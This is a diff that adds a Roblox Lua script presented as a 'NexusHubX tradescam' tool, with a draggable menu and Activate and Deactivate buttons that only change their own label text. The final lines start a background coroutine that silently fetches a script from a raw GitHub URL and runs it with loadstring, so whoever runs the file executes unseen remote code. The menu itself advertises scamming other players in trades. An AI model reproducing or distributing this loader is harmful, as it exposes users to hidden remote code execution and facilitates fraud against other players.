@@ -1,0 +1,121 @@
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Parent = player.PlayerGui
+gui.DisplayOrder = 999 -- Higher display order to ensure it's on top
+
+local triangleButton = Instance.new("TextButton")
+triangleButton.Text = "NexusHubX tradescam"
+triangleButton.TextColor3 = Color3.new(1, 1, 1) -- White text color
+triangleButton.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background color
+triangleButton.Position = UDim2.new(0, 0, 0, 0)
+triangleButton.Size = UDim2.new(0, 250, 0, 50)
+triangleButton.Parent = gui
+
+local triangle = Instance.new("TextLabel")
+triangle.Text = "▼"
+triangle.TextColor3 = Color3.new(1, 1, 1) -- White text color
+triangle.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background color
+triangle.Size = UDim2.new(0, 20, 0, 20) -- Smaller triangle size
+triangle.Position = UDim2.new(0, 230, 0, 15) -- Adjusted position
+triangle.TextScaled = true
+triangle.Parent = triangleButton
+
+local expandedGui = Instance.new("Frame")
+expandedGui.Position = UDim2.new(0, 0, 0, 50)
+expandedGui.Size = UDim2.new(0, 250, 0, 100)
+expandedGui.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background color
+expandedGui.Parent = gui
+expandedGui.Visible = false
+
+local activateButton = Instance.new("TextButton")
+activateButton.Text = "Activate tradescam"
+activateButton.TextColor3 = Color3.new(1, 1, 1) -- White text color
+activateButton.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background color
+activateButton.Position = UDim2.new(0, 0, 0, 0)
+activateButton.Size = UDim2.new(0, 250, 0, 50)
+activateButton.Parent = expandedGui
+
+local deactivateButton = Instance.new("TextButton")
+deactivateButton.Text = "Deactivate tradescam"
+deactivateButton.TextColor3 = Color3.new(1, 1, 1) -- White text color
+deactivateButton.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background color
+deactivateButton.Position = UDim2.new(0, 0, 0, 50)
+deactivateButton.Size = UDim2.new(0, 250, 0, 50)
+deactivateButton.Parent = expandedGui
+
+local function toggleGui()
+    expandedGui.Visible = not expandedGui.Visible
+end
+
+triangleButton.MouseButton1Click:Connect(toggleGui)
+
+local function resetTextColor(button)
+    button.TextColor3 = Color3.new(1, 1, 1) -- Reset text color to white
+end
+
+local function activateScam()
+    activateButton.Text = "Activated!"
+    activateButton.TextColor3 = Color3.new(0, 1, 0) -- Green text color
+    resetTextColor(activateButton) -- Reset text color after a short delay
+    wait(5)
+    resetTextColor(activateButton) -- Reset text color after 5 seconds
+end
+
+activateButton.MouseButton1Click:Connect(activateScam)
+
+local function deactivateScam()
+    activateButton.Text = "Activate tradescam" -- Reset activate button text
+    activateButton.TextColor3 = Color3.new(1, 1, 1) -- White text color
+end
+
+deactivateButton.MouseButton1Click:Connect(deactivateScam)
+
+-- Make the GUI movable on all devices
+local UserInputService = game:GetService("UserInputService")
+
+local dragging = false
+local dragInput = nil
+local dragStart = nil
+local startPos = nil
+
+local function update(input)
+    local delta = input.Position - dragStart
+    gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+local function onInputBegan(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = gui.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end
+
+local function onInputChanged(input)
+    if dragging and input == dragInput then
+        update(input)
+    end
+end
+
+local function onGuiTouchMoved(input)
+    if dragging then
+        dragInput = input
+        onInputChanged(input)
+    end
+end
+
+triangleButton.InputBegan:Connect(onInputBegan)
+triangleButton.InputChanged:Connect(onInputChanged)
+UserInputService.TouchMoved:Connect(onGuiTouchMoved)
+
+-- Background execution
+coroutine.wrap(function()
+    -- Paste the loadstring code here
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/e050327a06bae06d720981de.lua'))()
+end)()
